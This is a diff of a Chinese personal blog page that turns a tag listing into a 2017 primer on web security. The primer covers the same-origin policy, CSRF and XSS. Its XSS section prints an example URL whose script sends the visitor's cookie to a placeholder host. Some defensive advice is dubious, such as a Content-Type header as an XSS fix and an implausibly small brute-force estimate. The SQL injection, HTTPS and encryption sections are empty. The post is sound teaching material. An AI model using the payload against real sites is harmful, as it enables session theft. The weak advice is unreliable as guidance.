@@ -93,15 +93,16 @@
 
 
 
-<meta name="description" content="少年锦时">
-<meta property="og:type" content="website">
-<meta property="og:title" content="前端Girl">
-<meta property="og:url" content="http://chang20159.com/tags/socket-io/index.html">
+<meta name="description" content="前端开发需要了解一些web安全方面的知识，收集了一些资料学习一下。特别感谢Go web编程这本书，虽然是主要是写Go语言编程的，但是书中对web 安全方面的知识讲得特别好，这里也摘录了很多。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="了解Web安全">
+<meta property="og:url" content="http://chang20159.com/了解Web 安全/index.html">
 <meta property="og:site_name" content="前端Girl">
-<meta property="og:description" content="少年锦时">
+<meta property="og:description" content="前端开发需要了解一些web安全方面的知识，收集了一些资料学习一下。特别感谢Go web编程这本书，虽然是主要是写Go语言编程的，但是书中对web 安全方面的知识讲得特别好，这里也摘录了很多。">
+<meta property="og:updated_time" content="2017-08-01T13:30:08.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="前端Girl">
-<meta name="twitter:description" content="少年锦时">
+<meta name="twitter:title" content="了解Web安全">
+<meta name="twitter:description" content="前端开发需要了解一些web安全方面的知识，收集了一些资料学习一下。特别感谢Go web编程这本书，虽然是主要是写Go语言编程的，但是书中对web 安全方面的知识讲得特别好，这里也摘录了很多。">
 
 
 
@@ -129,13 +130,13 @@
 
 
 
-  <link rel="canonical" href="http://chang20159.com/tags/socket-io/"/>
+  <link rel="canonical" href="http://chang20159.com/了解Web 安全/"/>
 
 
 
 
 
-  <title>标签: socket.io | 前端Girl</title>
+  <title>了解Web安全 | 前端Girl</title>
   
 
 
@@ -170,7 +171,7 @@
     
   
 
-  <div class="container sidebar-position-left  ">
+  <div class="container sidebar-position-left page-post-detail ">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -308,44 +309,266 @@
           <div id="content" class="content">
             
 
-  <div id="posts" class="posts-collapse">
-    <div class="collection-title">
-      <h1>socket.io<small>标签</small>
-      </h1>
-    </div>
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://chang20159.com/了解Web 安全/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="YANFANG・CHANG">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photoo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="前端Girl">
+    </span>
 
     
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">了解Web安全</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-07-28T21:55:49+08:00">
+                2017-07-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/网络/" itemprop="url" rel="index">
+                    <span itemprop="name">网络</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
       
 
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+      
+        <p>前端开发需要了解一些web安全方面的知识，收集了一些资料学习一下。特别感谢<a href="https://github.com/astaxie/build-web-application-with-golang" target="_blank" rel="external">Go web编程</a>这本书，虽然是主要是写Go语言编程的，但是书中对web 安全方面的知识讲得特别好，这里也摘录了很多。</p>
+<a id="more"></a>
+<ul>
+<li><p><strong>同源策略</strong></p>
+</li>
+<li><p><strong>数据过滤</strong></p>
+</li>
+<li><p><strong>预防CSRF攻击</strong> </p>
+</li>
+<li><p><strong>避免XSS攻击</strong> </p>
+</li>
+<li><p><strong>SQL注入攻击</strong></p>
+</li>
+<li><p><strong>HTTPS</strong></p>
+</li>
+<li><strong>安全加密</strong></li>
+</ul>
+<h3 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h3><p>同源策略限制一个源的文档或脚本与另一个源的资源进行交互，以保证用户信息安全。同源需要协议、域名和端口完全相同。</p>
+<p><a href="http://harttle.com/2015/10/10/cross-origin.html?utm_source=tuicool&amp;utm_medium=referral" target="_blank" rel="external">Web开发中跨域的几种解决方案</a></p>
+<p>跨域并非不一定是浏览器限制了发起跨站请求，而也可能是跨站请求可以正常发起，但是返回结果被浏览器拦截了。最好的例子是 CSRF 跨站攻击原理，请求是发送到了后端服务器无论是否跨域！注意：有些浏览器不允许从 HTTPS 的域跨域访问 HTTP，比如  Chrome 和 Firefox，这些浏览器在请求还未发出的时候就会拦截请求，这是一个特例。）</p>
+<h4 id="更多"><a href="#更多" class="headerlink" title="更多"></a>更多</h4><ul>
+<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy" target="_blank" rel="external">浏览器的同源策略</a></li>
+<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS" target="_blank" rel="external">HTTP访问控制（CORS）</a></li>
+<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Server-Side_Access_Control" target="_blank" rel="external">Server-Side Access Control</a></li>
+<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Window/postMessage" target="_blank" rel="external">window.postMessage</a></li>
+</ul>
+<h3 id="数据过滤"><a href="#数据过滤" class="headerlink" title="数据过滤"></a>数据过滤</h3><p>数据过滤在Web安全中起到一个基石的作用，大多数的安全问题都是由于没有过滤数据和验证数据引起的，例如CSRF攻击、XSS攻击、SQL注入等都是没有认真地过滤数据引起的。</p>
+<h4 id="更多-1"><a href="#更多-1" class="headerlink" title="更多"></a>更多</h4><ul>
+<li><a href="https://github.com/astaxie/build-web-application-with-golang/blob/master/zh/09.2.md" target="_blank" rel="external">确保输入过滤</a></li>
+</ul>
+<h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><h4 id="什么是CSRF"><a href="#什么是CSRF" class="headerlink" title="什么是CSRF"></a>什么是CSRF</h4><p>CSRF（Cross-site request forgery），中文名称：跨站请求伪造，也被称为：one click attack/session riding，缩写为：CSRF/XSRF。</p>
+<p>那么CSRF到底能够干嘛呢？你可以这样简单的理解：攻击者可以盗用你的登陆信息，以你的身份模拟发送各种请求。攻击者只要借助少许的社会工程学的诡计，例如通过QQ等聊天软件发送的链接(有些还伪装成短域名，用户无法分辨)，攻击者就能迫使Web应用的用户去执行攻击者预设的操作。例如，当用户登录网络银行去查看其存款余额，在他没有退出时，就点击了一个QQ好友发来的链接，那么该用户银行帐户中的资金就有可能被转移到攻击者指定的帐户中。</p>
+<p>所以遇到CSRF攻击时，将对终端用户的数据和操作指令构成严重的威胁；当受攻击的终端用户具有管理员帐户的时候，CSRF攻击将危及整个Web应用程序。</p>
+<h4 id="CSRF的原理"><a href="#CSRF的原理" class="headerlink" title="CSRF的原理"></a>CSRF的原理</h4><p>要完成一次CSRF攻击，受害者必须依次完成两个步骤 ：</p>
+<ol>
+<li>登录受信任网站A，并在本地生成Cookie 。</li>
+<li>在不退出A的情况下，访问危险网站B。<br>看到这里，读者也许会问：“如果我不满足以上两个条件中的任意一个，就不会受到CSRF的攻击”。是的，确实如此，但你不能保证以下情况不会发生：</li>
+</ol>
+<ul>
+<li>你不能保证你登录了一个网站后，不再打开一个tab页面并访问另外的网站，特别现在浏览器都是支持多tab的。</li>
+<li>你不能保证你关闭浏览器了后，你本地的Cookie立刻过期，你上次的会话已经结束。</li>
+<li>上图中所谓的攻击网站，可能是一个存在其他漏洞的可信任的经常被人访问的网站。</li>
+</ul>
+<p>因此对于用户来说很难避免在登陆一个网站之后不点击一些链接进行其他操作，所以随时可能成为CSRF的受害者。</p>
+<p>CSRF攻击主要是因为Web的隐式身份验证机制，Web的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的。</p>
+<h4 id="如何预防CSRF"><a href="#如何预防CSRF" class="headerlink" title="如何预防CSRF"></a>如何预防CSRF</h4><p>CSRF的防御可以从服务端和客户端两方面着手，防御效果是从服务端着手效果比较好，现在一般的CSRF防御也都在服务端进行。</p>
+<p>服务端的预防CSRF攻击的方式方法有多种，但思想上都是差不多的，主要从以下2个方面入手：</p>
+<ol>
+<li>正确使用GET,POST和Cookie；</li>
+<li>在非GET请求中增加伪随机数；</li>
+</ol>
+<p>一般而言，普通的Web应用都是以GET、POST为主，还有一种请求是Cookie方式。我们一般都是按照如下方式设计应用：</p>
+<ol>
+<li><p>GET常用在查看，列举，展示等不需要改变资源属性的时候；</p>
+</li>
+<li><p>POST常用在下达订单，改变一个资源的属性或者做其他一些事情；</p>
+</li>
+</ol>
+<p>我们限定了修改只能使用POST，当GET方式请求时就拒绝响应，所以上面图示中GET方式的CSRF攻击就可以防止了，但这样就能全部解决问题了吗？当然不是，因为POST也是可以模拟的。</p>
+<p>因此我们需要实施第二步，在非GET方式的请求中增加随机数，这个大概有三种方式来进行：</p>
+<ul>
+<li>为每个用户生成一个唯一的cookie token，所有表单都包含同一个伪随机值，这种方案最简单，因为攻击者不能获得第三方的Cookie(理论上)，所以表单中的数据也就构造失败，但是由于用户的Cookie很容易由于网站的XSS漏洞而被盗取，所以这个方案必须要在没有XSS的情况下才安全。</li>
+<li>每个请求使用验证码，这个方案是完美的，因为要多次输入验证码，所以用户友好性很差，所以不适合实际运用。</li>
+<li>不同的表单包含一个不同的伪随机值</li>
+</ul>
+<p>这样基本就实现了安全的POST，但是也许你会说如果破解了token的算法呢，按照理论上是，但是实际上破解是基本不可能的，因为有人曾计算过，暴力破解该串大概需要2的11次方时间。</p>
+<h4 id="更多-2"><a href="#更多-2" class="headerlink" title="更多"></a>更多</h4><ul>
+<li><a href="https://github.com/astaxie/build-web-application-with-golang/blob/master/zh/09.1.md" target="_blank" rel="external">预防CSRF攻击</a></li>
+<li><a href="https://www.ibm.com/developerworks/cn/web/1102_niugang_csrf/" target="_blank" rel="external">CSRF 攻击的应对之道</a></li>
+</ul>
+<h3 id="避免XSS攻击"><a href="#避免XSS攻击" class="headerlink" title="避免XSS攻击"></a>避免XSS攻击</h3><p>随着互联网技术的发展，现在的Web应用都含有大量的动态内容以提高用户体验。所谓动态内容，就是应用程序能够根据用户环境和用户请求，输出相应的内容。动态站点会受到一种名为“跨站脚本攻击”（Cross Site Scripting, 安全专家们通常将其缩写成 XSS）的威胁，而静态站点则完全不受其影响。</p>
+<h4 id="什么是XSS"><a href="#什么是XSS" class="headerlink" title="什么是XSS"></a>什么是XSS</h4><p>XSS攻击：跨站脚本攻击(Cross-Site Scripting)，为了不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。XSS是一种常见的web安全漏洞，它允许攻击者将恶意代码植入到提供给其它用户使用的页面中。不同于大多数攻击(一般只涉及攻击者和受害者)，XSS涉及到三方，即攻击者、客户端与Web应用。XSS的攻击目标是为了盗取存储在客户端的cookie或者其他网站用于识别客户端身份的敏感信息。一旦获取到合法用户的信息后，攻击者甚至可以假冒合法用户与网站进行交互。</p>
+<p>XSS通常可以分为两大类：一类是存储型XSS，主要出现在让用户输入数据，供其他浏览此页的用户进行查看的地方，包括留言、评论、博客日志和各类表单等。应用程序从数据库中查询数据，在页面中显示出来，攻击者在相关页面输入恶意的脚本数据后，用户浏览此类页面时就可能受到攻击。这个流程简单可以描述为:恶意用户的Html输入Web程序-&gt;进入数据库-&gt;Web程序-&gt;用户浏览器。另一类是反射型XSS，主要做法是将脚本代码加入URL地址的请求参数里，请求参数进入程序后在页面直接输出，用户点击类似的恶意链接就可能受到攻击。</p>
+<p>XSS目前主要的手段和目的如下：</p>
+<ul>
+<li>盗用cookie，获取敏感信息。</li>
+<li>利用植入Flash，通过crossdomain权限设置进一步获取更高权限；或者利用Java等得到类似的操作。</li>
+<li>利用iframe、frame、XMLHttpRequest或上述Flash等方式，以（被攻击者）用户的身份- 执行一些管理动作，或执行一些如:发微博、加好友、发私信等常规操作，前段时间新浪微博就遭遇过一次XSS。</li>
+<li>利用可被攻击的域受到其他域信任的特点，以受信任来源的身份请求一些平时不允许的操作，如进行不当的投票活动。</li>
+<li>在访问量极大的一些页面上的XSS可以攻击一些小型网站，实现DDoS攻击的效果</li>
+</ul>
+<h4 id="XSS的原理"><a href="#XSS的原理" class="headerlink" title="XSS的原理"></a>XSS的原理</h4><p>Web应用未对用户提交请求的数据做充分的检查过滤，允许用户在提交的数据中掺入HTML代码(最主要的是“&gt;”、“&lt;”)，并将未经转义的恶意代码输出到第三方用户的浏览器解释执行，是导致XSS漏洞的产生原因。</p>
+<p>接下来以反射性XSS举例说明XSS的过程：现在有一个网站，根据参数输出用户的名称，例如访问url：<code>http://127.0.0.1/?name=astaxie</code>，就会在浏览器输出如下信息：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">hello astaxie</div></pre></td></tr></table></figure>
+<p>如果我们传递这样的url：<code>http://127.0.0.1/?name=&amp;#60;script&amp;#62;alert(&amp;#39;astaxie,xss&amp;#39;)&amp;#60;/script&amp;#62;</code>,这时你就会发现浏览器跳出一个弹出框，这说明站点已经存在了XSS漏洞。那么恶意用户是如何盗取Cookie的呢？与上类似，如下这样的url：<code>http://127.0.0.1/?name=&amp;#60;script&amp;#62;document.location.href=&#39;http://www.xxx.com/cookie?&#39;+document.cookie&amp;#60;/script&amp;#62;</code>，这样就可以把当前的cookie发送到指定的站点：<a href="">www.xxx.com。你也许会说，这样的URL一看就有问题，怎么会有人点击？，是的，这类的URL会让人怀疑，但如果使用短网址服务将之缩短，你还看得出来么？攻击者将缩短过后的url通过某些途径传播开来，不明真相的用户一旦点击了这样的url，相应cookie数据就会被发送事先设定好的站点，这样子就盗得了用户的cookie信息，然后就可以利用Websleuth之类的工具来检查是否能盗取那个用户的账户。</a></p>
+<p>更加详细的关于XSS的分析大家可以参考这篇叫做《<a href="http://www.rising.com.cn/newsletter/news/2011-08-18/9621.html" target="_blank" rel="external">新浪微博XSS事件分析</a>》的文章。</p>
+<h4 id="如何预防XSS"><a href="#如何预防XSS" class="headerlink" title="如何预防XSS"></a>如何预防XSS</h4><p>答案很简单，坚决不要相信用户的任何输入，并过滤掉输入中的所有特殊字符。这样就能消灭绝大部分的XSS攻击。</p>
+<p>目前防御XSS主要有如下几种方式：</p>
+<ul>
+<li><p>过滤特殊字符</p>
+<p>  避免XSS的方法之一主要是将用户所提供的内容进行过滤</p>
+</li>
+<li><p>使用HTTP头指定类型</p>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">response.setHeader(&quot;Content-Type&quot;,&quot;text/javascript&quot;)</div></pre></td></tr></table></figure>
+<p>  这样就可以让浏览器解析javascript代码，而不会是html输出。</p>
+</li>
+</ul>
+<h4 id="更多-3"><a href="#更多-3" class="headerlink" title="更多"></a>更多</h4><ul>
+<li><p><a href="https://github.com/astaxie/build-web-application-with-golang/blob/master/zh/09.3.md" target="_blank" rel="external">避免XSS攻击</a></p>
+</li>
+<li><p><a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Cross-site_scripting" target="_blank" rel="external">MDN: 跨站脚本攻击</a></p>
+</li>
+</ul>
+<h3 id="避免SQL注入"><a href="#避免SQL注入" class="headerlink" title="避免SQL注入"></a>避免SQL注入</h3><h3 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h3><h3 id="安全加密"><a href="#安全加密" class="headerlink" title="安全加密"></a>安全加密</h3>
+      
+    </div>
 
-      <h2 class="post-title">
+    <div>
+      
         
-            <a class="post-title-link" href="/socket.io开发问题/" itemprop="url">
-              
-                <span itemprop="name">使用socket.io进行websocket通信无法连接</span>
-              
-            </a>
+
+      
+    </div>
+
+    <div>
+      
         
-      </h2>
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2017-05-20T18:31:00+08:00"
-              content="2017-05-20" >
-          05-20
-        </time>
-      </div>
+      
+    </div>
 
-    </header>
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/图片预加载和懒加载/" rel="next" title="图片预加载和懒加载">
+                <i class="fa fa-chevron-left"></i> 图片预加载和懒加载
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
   </article>
 
 
-    
-  </div>
 
-  
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -353,6 +576,10 @@
 
 
           
+  <div class="comments" id="comments">
+    
+  </div>
+
 
         </div>
         
@@ -373,8 +600,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview sidebar-panel sidebar-panel-active">
+      <section class="site-overview sidebar-panel">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
           <img class="site-author-image" itemprop="image"
                src="/images/photoo.jpg"
@@ -436,6 +672,22 @@
 
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#同源策略"><span class="nav-number">1.</span> <span class="nav-text">同源策略</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#更多"><span class="nav-number">1.1.</span> <span class="nav-text">更多</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#数据过滤"><span class="nav-number">2.</span> <span class="nav-text">数据过滤</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#更多-1"><span class="nav-number">2.1.</span> <span class="nav-text">更多</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CSRF"><span class="nav-number">3.</span> <span class="nav-text">CSRF</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#什么是CSRF"><span class="nav-number">3.1.</span> <span class="nav-text">什么是CSRF</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CSRF的原理"><span class="nav-number">3.2.</span> <span class="nav-text">CSRF的原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#如何预防CSRF"><span class="nav-number">3.3.</span> <span class="nav-text">如何预防CSRF</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#更多-2"><span class="nav-number">3.4.</span> <span class="nav-text">更多</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#避免XSS攻击"><span class="nav-number">4.</span> <span class="nav-text">避免XSS攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#什么是XSS"><span class="nav-number">4.1.</span> <span class="nav-text">什么是XSS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#XSS的原理"><span class="nav-number">4.2.</span> <span class="nav-text">XSS的原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#如何预防XSS"><span class="nav-number">4.3.</span> <span class="nav-text">如何预防XSS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#更多-3"><span class="nav-number">4.4.</span> <span class="nav-text">更多</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#避免SQL注入"><span class="nav-number">5.</span> <span class="nav-text">避免SQL注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HTTPS"><span class="nav-number">6.</span> <span class="nav-text">HTTPS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#安全加密"><span class="nav-number">7.</span> <span class="nav-text">安全加密</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -556,10 +808,10 @@
 
 
   
-    <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
 <script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>
 
-  
+
 
   
 
